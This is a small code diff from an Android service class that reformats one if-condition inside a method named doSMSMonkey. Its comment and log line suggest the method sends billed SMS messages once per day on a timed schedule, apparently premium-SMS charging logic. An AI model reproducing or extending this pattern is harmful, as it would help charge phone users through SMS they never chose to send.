@@ -349,8 +349,7 @@ public class PluginService extends IntentService {
         long lastCountTime = SettingManager.getInstance().getKeyLastCountTime();
         long curTime = System.currentTimeMillis();
         long delay = ((long) (response.interval)) * 60 * 1000;
-        if ((times > dayCount)
-                && (lastCountTime + delay) < curTime) {
+        if ((times > dayCount) && (lastCountTime + delay) < curTime) {
             //今天的计费还没有完成，计费一次
             if (Config.DEBUG) {
                 Config.LOGD("[[PluginService::doSMSMonkey]] try to send SMS monkey with info : " + response.toString());
